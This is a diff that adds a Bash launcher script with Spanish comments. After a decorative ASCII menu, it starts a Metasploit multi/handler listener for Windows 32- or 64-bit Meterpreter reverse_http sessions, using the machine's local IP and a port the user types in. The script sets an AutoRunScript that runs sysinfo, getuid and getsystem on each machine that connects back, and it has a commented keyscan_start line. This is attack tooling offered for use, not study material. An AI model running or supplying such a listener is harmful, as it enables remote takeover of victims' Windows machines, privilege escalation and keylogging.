@@ -1,0 +1,276 @@
+#! /bin/bash/
+###########  Colores  #################
+############  Colores  #################
+rojff='\033[1;31m'
+rojx='\e[101m'
+rojs='\e[41m'
+roj='\033[31m'
+ro2='\033[91m'
+rojsub='\e[1;4;91m'
+
+ver='\033[32m'
+#ver0='\033[1;32m'
+ve2='\033[92m'
+#ve20='\033[1;32m'
+
+ama='\033[33m'
+amas='\033[1;4;33m'
+am0='\033[1;33m'
+
+azu='\033[34m'
+az0='\033[1;34m'
+neg='\e[1m'
+pur='\033[35m'
+
+cy='\033[36m'
+#cy0='\033[1;36m'
+##---------------
+sub='\e[4m'
+#fos='\e[5m'
+gri='\e[2m'
+#----------------
+fin='\033[01;37m'
+#----------------
+#c0lorx="$(sh /xg/0r/.betas/i/colorxx2)"
+
+#h0ra2="$(sh /xg/0r/.betas/i/color2)"
+########     Fin Colores ##############----
+
+#c00l="$(sh /xg/0r/.betas/i/color)"
+#bannc0l="$(sh /xg/0r/.betas/i/colorbanner)"
+########     Fin Colores ##############----
+
+#------------------------------------------------------------
+#########   Fechas/hora   ############
+diasem="$(date +%A)"
+mes="$(date +%B)"
+diafech="$(date +%e)"
+ttime="$(date +'%I:%M')"
+tt2="$(date +%e)"
+tt3="$(date +%M)"
+#timwe="$(date +'%I::%M')"
+ye="$(date +%Y)"
+######################################
+#-------------------------------------------
+
+########################### ip/red ####################
+
+ip="$(ip route show|grep ' src ' |cut -d' ' -f12)"
+#ant3=`netstat -r | grep "default" | awk {'print $8'}`
+#nomred="$(nmcli c|sed -n '2p'|cut -d' ' -f1)"
+#ipx=$(hostname -I)
+#routt="$(ip route show|grep ' dhcp '|cut -d' ' -f3)"
+#####################################
+
+
+inici0 () {
+clear
+echo "$cy ⍢⍣⍤⍥MMM⍨⍩⍦MM⍤MM⍦⍧MMMM⍩⍦MMM⍥⍧.⎋  
+    ⍥⍣⍤  ⍨⍩⍦  ⍬⍹ MP   ⍧⎃MM⍩$roj     ──▄────▄▄▄▄▄▄▄────▄─── $cy
+    ⍧⍬ P ⍧.M ⍿⍪⍦{ .⎋⍤M M⍦⍧⍬⍤$roj    ─▀▀▄─▄█████████▄─▄▀▀── $cy
+    ⍥⍨⍩ ⍦ ⍧   ⍿⎎   ⎋⎍⍩ ⍦⍤⍥⍨$roj     ─────██─▀███▀─██──────$fin
+      [ Ｅｎｔｅｒｉｎｇ ]$roj      ───▄─▀████▀████▀─▄────$cy
+     ⎃ M  ⍾⎀⍽  ⍦ ⍤⍥ ⍨☋  ⍨⍩⍦$roj     ─▀█────██▀█▀██────█▀── $cy
+    ⍪☋⍤$finＴｈｅ　Ｃｙｂｅｒ$cy⍧⎃M⎍ 
+     ⍹⍿⍪⍦☍⍬⍿⍪ ☍⍬⍿⍪⍬ ⍥ ⍨☋.⎋⎍      
+    ⍧☋☌$finㄩ几ᗪ乇尺山ㄖ尺ㄥᗪ$cy⍩⍦      
+     . ⎋⍹☊ ☋ ☌⍤  ⍽⍧⎃MM ⍣⍦☍⎎$fin  ┌───┤ Windows_\033[31mx32-bits$fin:::$ama 1$cy
+     ⍧⍥  ⍨⍩⍦ ⍧⍬☋ ⍿ ⍤ ⍥ ⍨ ⍩⍦$fin  │  $cy   
+     M ⍤ ⎋⎍ ⍦⍤ ☌☍ ⍬⎀⍽⍧ ⎃MM⎋$fin  └┤ Windows_\033[31mx64-bits$fin:::$ama 2 $cy
+     ⍩⍦ ⍧ ⍶⍤⍷⍸⍹⍣ ⍣⍹☊⍥☌ ☍⍬ ⍿  $fin"      
+echo -n "  ::::::::::::::::>$ama "
+read winn
+#####################################
+    case $winn in
+      1 ) winn32xx;;
+      2 ) winn64xx;;
+      * ) sleep 1; echo "[1;31m
+  Opción incorrecta";sleep 1; clear; enterchaoss;;
+    esac
+####################################
+}
+
+winn64xx () {
+echo "$fin
+  └──┤\033[1;36mひ丂乇 eXpl0!t(\033[31mmulti/handler$cy)$fin 
+  $cy set PAYLOAD =>$roj windows/x64/meterpreter... $fin                             
+  $cy set LHOST => $ip "   
+  echo -n "  $cy set LPORT $fin "
+  read p0rt                                                 
+  echo "$cy set AutoRunScript───┐"
+  echo "     └───multi_console_command"
+ echo -n "-cl$roj sysinfo,getuid$fin"
+read autorun
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	sleep 1s
+clear
+
+
+
+sleep 0.1s; echo "                          ########                  #"
+sleep 0.1s; echo "                      #################            #"
+sleep 0.1s; echo "                   ######################         #"
+sleep 0.1s; echo "                  #########################      #"
+sleep 0.1s; echo "                ############################"
+sleep 0.1s; echo "               ##############################"
+sleep 0.1s; echo "               ###############################"
+sleep 0.1s; echo "              ###############################"
+sleep 0.1s; echo "              ##############################"
+sleep 0.1s; echo "                              #    ########   #"
+sleep 0.1s; echo "             $roj    ##        ### $fin       ####   ##"
+sleep 0.1s; echo "                                      ###   ###"
+sleep 0.1s; echo "                                    ####   ###"
+sleep 0.1s; echo "              ####          ##########   #### "
+sleep 0.1s; echo "               #######################   #### "
+sleep 0.1s; echo "                 ####################   ####"
+sleep 0.1s; echo "                  ##################  ####"
+sleep 0.1s; echo "                    ############      ##"
+sleep 0.1s; echo "                       ########        ###"
+sleep 0.1s; echo "                      #########        #####"
+sleep 0.1s; echo "                   ############      ######"
+sleep 0.1s; echo "                   ########      #########"
+sleep 0.1s; echo "                     #####       ########"
+sleep 0.1s; echo "                       ###       #########"
+sleep 0.1s; echo "                      ######    ############"
+sleep 0.1s; echo "                     #######################"
+sleep 0.1s; echo "                     #   #   ###  #   #   ##"
+sleep 0.1s; echo "                     ########################"
+sleep 0.1s; echo "                      ##     ##   ##     ##"
+sleep 0.1s; echo "                            https://metasploit.com $cy"
+
+
+# keyscan_start
+
+#cat /xg/0r/.betas/bann/metasploit-bann  
+#cat /xg/0r/.betas/bann/bannCone
+echo " $fin      =[$ama metasploit v5.0.49-dev$fin]"
+#+ -- --=[ 1927 exploits - 1076 auxiliary - 330 post       ]
+#+ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
+#+ -- --=[ 7 evasion 
+#"
+   sleep 0.1s; echo ""
+   date
+ msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_http;set LPORT $p0rt;set LHOST $ip;set AutoRunScript multi_console_command -cl 'sysinfo,getuid$autorun';exploit;date;"
+} 
+
+
+winn32xx () {
+echo "$fin
+  └──┤\033[1;36mひ丂乇 eXpl0!t(\033[31mmulti/handler$cy)$fin 
+  $cy set PAYLOAD =>$roj windows/meterpreter... $fin
+  $cy set LHOST =>$roj $ip$fin"
+  echo -n "  $cy set LPORT $fin "
+  read p0rt
+  echo "$cy set AutoRunScript───┐"
+  echo "     └───multi_console_command"
+ echo -n "-cl$roj sysinfo,getpid,getsystem$fin"
+read autorun
+
+
+
+
+
+
+
+
+
+
+
+
+
+  sleep 1s
+clear
+
+
+
+sleep 0.1s; echo "                          ########                  #"
+sleep 0.1s; echo "                      #################            #"
+sleep 0.1s; echo "                   ######################         #"
+sleep 0.1s; echo "                  #########################      #"
+sleep 0.1s; echo "                ############################"
+sleep 0.1s; echo "               ##############################"
+sleep 0.1s; echo "               ###############################"
+sleep 0.1s; echo "              ###############################"
+sleep 0.1s; echo "              ##############################"
+sleep 0.1s; echo "                              #    ########   #"
+sleep 0.1s; echo "             $roj    ##        ### $fin       ####   ##"
+sleep 0.1s; echo "                                      ###   ###"
+sleep 0.1s; echo "                                    ####   ###"
+sleep 0.1s; echo "              ####          ##########   #### "
+sleep 0.1s; echo "               #######################   #### "
+sleep 0.1s; echo "                 ####################   ####"
+sleep 0.1s; echo "                  ##################  ####"
+sleep 0.1s; echo "                    ############      ##"
+sleep 0.1s; echo "                       ########        ###"
+sleep 0.1s; echo "                      #########        #####"
+sleep 0.1s; echo "                   ############      ######"
+sleep 0.1s; echo "                   ########      #########"
+sleep 0.1s; echo "                     #####       ########"
+sleep 0.1s; echo "                       ###       #########"
+sleep 0.1s; echo "                      ######    ############"
+sleep 0.1s; echo "                     #######################"
+sleep 0.1s; echo "                     #   #   ###  #   #   ##"
+sleep 0.1s; echo "                     ########################"
+sleep 0.1s; echo "                      ##     ##   ##     ##"
+sleep 0.1s; echo "                            https://metasploit.com $cy"
+
+
+# keyscan_start
+
+#cat /xg/0r/.betas/bann/metasploit-bann  
+#cat /xg/0r/.betas/bann/bannCone
+echo " $fin      =[$ama metasploit v5.0.49-dev$fin]"
+#+ -- --=[ 1927 exploits - 1076 auxiliary - 330 post       ]
+#+ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
+#+ -- --=[ 7 evasion 
+#"
+   sleep 0.1s; echo ""
+   date
+ msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_http;set LPORT $p0rt;set LHOST $ip;set AutoRunScript multi_console_command -cl 'sysinfo,getuid$autorun';exploit;date;"
+} 
+
+
+
+
+
+
+
+
+#n0mb=$(zenity --title="☠ Ｕｓｕａｒｉｏ ☠" --text ":::Escribe tu Nombre de Usuario en GitHub:::" --entry --width 100) > /dev/null 2>&1
+
+#ppsx=$(zenity  --file-selection --title="Selecciona un Archivo Para Subir a GitHub:::::::")  > /dev/null 2>&1
+#ppsx=$(zenity  --file-selection --title="Selecciona un Archivo Para Subir a GitHub::::::: "--directory)  > /dev/null 2>&1
+
+#read varr
+
+
+# > /dev/null 2>&1
+#
+###################################
+#  if [ $varr = "1" ]; then
+#clear
+#	 echo "
+
+#"
+#else
+#echo ""
+#fi
+###################################
+inici0
